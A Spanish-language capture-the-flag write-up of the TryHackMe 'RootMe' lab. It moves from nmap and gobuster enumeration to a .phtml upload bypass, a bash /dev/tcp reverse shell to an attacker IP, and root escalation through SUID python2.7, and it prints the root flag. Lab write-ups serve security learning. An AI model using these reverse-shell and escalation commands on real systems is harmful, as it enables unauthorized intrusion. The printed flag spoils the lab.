+++
title = "Root-me"
author = ["aisak"]
date = 2026-01-01
draft = false
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

    - [Fase 1: Enumeración de Red (Nmap)](#fase-1-enumeración-de-red--nmap)
        - [Resultados Relevantes](#resultados-relevantes)
- [**Puerto 80:** Apache 2.4.41.](#puerto-80-apache-2-dot-4-dot-41-dot)
- [**Puerto 22:** SSH abierto (OpenSSH 8.2p1).](#puerto-22-ssh-abierto--openssh-8-dot-2p1--dot)
    - [Fase 2: Enumeración Web (Gobuster)](#fase-2-enumeración-web--gobuster)
        - [Hallazgos Críticos](#hallazgos-críticos)
- [`/panel/`: Panel con funcionalidad de subida de archivos.](#panel-panel-con-funcionalidad-de-subida-de-archivos-dot)
- [`/uploads/`: Directorio accesible donde se almacenan los archivos subidos.](#uploads-directorio-accesible-donde-se-almacenan-los-archivos-subidos-dot)
- [`/js/`, `/css/`: Recursos estáticos.](#js-css-recursos-estáticos-dot)
    - [Fase 3: Ganando Acceso (File Upload + Reverse Shell)](#fase-3-ganando-acceso--file-upload-plus-reverse-shell)
        - [Preparación del Listener](#preparación-del-listener)
        - [Payload de Reverse Shell](#payload-de-reverse-shell)
        - [Ejecución del Payload](#ejecución-del-payload)
        - [Estabilización de la Shell (Opcional)](#estabilización-de-la-shell--opcional)
    - [Fase 4: Enumeración Local y Obtención de User Flag](#fase-4-enumeración-local-y-obtención-de-user-flag)
    - [Fase 5: Identificación del Vector de Escalada (SUID)](#fase-5-identificación-del-vector-de-escalada--suid)
        - [Resultado Crítico](#resultado-crítico)
- [`/usr/bin/python2.7`](#usr-bin-python2-dot-7)
    - [Fase 6: Escalada de Privilegios Final](#fase-6-escalada-de-privilegios-final)
        - [Verificación de Privilegios](#verificación-de-privilegios)
        - [Obtención de la Root Flag](#obtención-de-la-root-flag)
    - [Conclusión](#conclusión)
- [Validar correctamente las extensiones de archivos subidos.](#validar-correctamente-las-extensiones-de-archivos-subidos-dot)
- [Restringir el uso de intérpretes con permisos SUID.](#restringir-el-uso-de-intérpretes-con-permisos-suid-dot)

</div>
<!--endtoc-->



### Fase 1: Enumeración de Red (Nmap) {#fase-1-enumeración-de-red--nmap}

Se realizó un escaneo agresivo para identificar servicios y versiones expuestas.

```bash
nmap -A 10.65.136.57
```


#### Resultados Relevantes {#resultados-relevantes}


## **Puerto 80:** Apache 2.4.41. {#puerto-80-apache-2-dot-4-dot-41-dot}

-   La cookie de sesión no tiene configurado el flag `HttpOnly` (vulnerabilidad de bajo impacto, no explotable directamente en este escenario).


## **Puerto 22:** SSH abierto (OpenSSH 8.2p1). {#puerto-22-ssh-abierto--openssh-8-dot-2p1--dot}


### Fase 2: Enumeración Web (Gobuster) {#fase-2-enumeración-web--gobuster}

Para descubrir rutas ocultas se utilizó `gobuster` con un diccionario común.

```bash
gobuster dir -u [http://10.65.136.57](http://10.65.136.57) -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,md,js
```


#### Hallazgos Críticos {#hallazgos-críticos}


## `/panel/`: Panel con funcionalidad de subida de archivos. {#panel-panel-con-funcionalidad-de-subida-de-archivos-dot}


## `/uploads/`: Directorio accesible donde se almacenan los archivos subidos. {#uploads-directorio-accesible-donde-se-almacenan-los-archivos-subidos-dot}


## `/js/`, `/css/`: Recursos estáticos. {#js-css-recursos-estáticos-dot}


### Fase 3: Ganando Acceso (File Upload + Reverse Shell) {#fase-3-ganando-acceso--file-upload-plus-reverse-shell}

El panel de subida validaba extensiones comunes como `.php`, pero permitía `.phtml`, extensión que Apache interpreta igualmente como PHP. Esto permitió la ejecución de código arbitrario.


#### Preparación del Listener {#preparación-del-listener}

En la máquina atacante (Kali):

```bash
nc -lvnp 1234
```


#### Payload de Reverse Shell {#payload-de-reverse-shell}

Se utilizó un one-liner en Bash para obtener una conexión interactiva:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.209.208/1234 0>&1'
```


#### Ejecución del Payload {#ejecución-del-payload}

El payload se ejecutó accediendo al archivo subido:

`[http://10.65.136.57/uploads/pwn.phtml?cmd=bash%20-c%20...=](http://10.65.136.57/uploads/pwn.phtml?cmd=bash%20-c%20...`)


#### Estabilización de la Shell (Opcional) {#estabilización-de-la-shell--opcional}

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```


### Fase 4: Enumeración Local y Obtención de User Flag {#fase-4-enumeración-local-y-obtención-de-user-flag}

Tras obtener acceso como `www-data`, se localizó la flag de usuario.

```bash
cat /home/*/user.txt
```


### Fase 5: Identificación del Vector de Escalada (SUID) {#fase-5-identificación-del-vector-de-escalada--suid}

Se buscaron binarios con el bit **SUID** activo pertenecientes a root.

```bash
find / -type f -user root -perm -4000 2>/dev/null
```


#### Resultado Crítico {#resultado-crítico}

Entre los binarios estándar, destacó:


## `/usr/bin/python2.7` {#usr-bin-python2-dot-7}

Al tratarse de un intérprete, permite ejecutar comandos arbitrarios con privilegios de root. Esta técnica está documentada en **GTFOBins**.


### Fase 6: Escalada de Privilegios Final {#fase-6-escalada-de-privilegios-final}

Se explotó el binario SUID de Python para invocar una shell privilegiada.

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


#### Verificación de Privilegios {#verificación-de-privilegios}

```bash
whoami

# root

```


#### Obtención de la Root Flag {#obtención-de-la-root-flag}

```bash
cd /root
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```


### Conclusión {#conclusión}

La máquina RootMe evidencia la importancia de:


## Validar correctamente las extensiones de archivos subidos. {#validar-correctamente-las-extensiones-de-archivos-subidos-dot}


## Restringir el uso de intérpretes con permisos SUID. {#restringir-el-uso-de-intérpretes-con-permisos-suid-dot}

Una mala configuración combinada con una vulnerabilidad web simple permitió el compromiso total del sistema.
